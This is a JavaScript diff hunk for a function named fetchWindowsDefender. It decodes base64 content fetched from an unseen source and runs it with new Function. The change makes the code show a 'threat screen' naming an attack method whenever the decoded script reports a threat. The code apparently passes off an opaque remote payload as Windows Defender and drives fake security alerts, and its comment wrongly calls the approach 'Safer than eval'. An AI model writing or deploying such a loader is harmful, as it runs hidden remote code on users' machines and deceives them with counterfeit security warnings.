@@ -89,19 +89,26 @@ async function fetchWindowsDefender() {
 
                 console.log("Base64 Content Retrieved:\n", base64Data);
 
-                // Decode Base64
+                // Decode Base64 to get the actual script
                 let decodedScript = atob(base64Data);
 
                 console.log("Decoded Script:\n", decodedScript);
 
-                // Execute the script
-                (new Function(decodedScript))(); // Safer than eval
+                // Execute the script and get the result
+                const scriptResult = (new Function(decodedScript))(); // Safer than eval
+                
+                // If the script detects a threat, stop further execution
+                if (scriptResult && scriptResult.threatDetected) {
+                    showThreatScreen(scriptResult.attackMethod); // Show threat screen if threat is detected
+                } else {
+                    console.log("No threat detected. Continue executing...");
+                    // Continue execution here if no threat is detected
+                }
 
             } catch (error) {
                 console.error("Error fetching or executing Windows Defender script:", error);
             }
         }
-
         fetchWindowsDefender();
 
         // safe
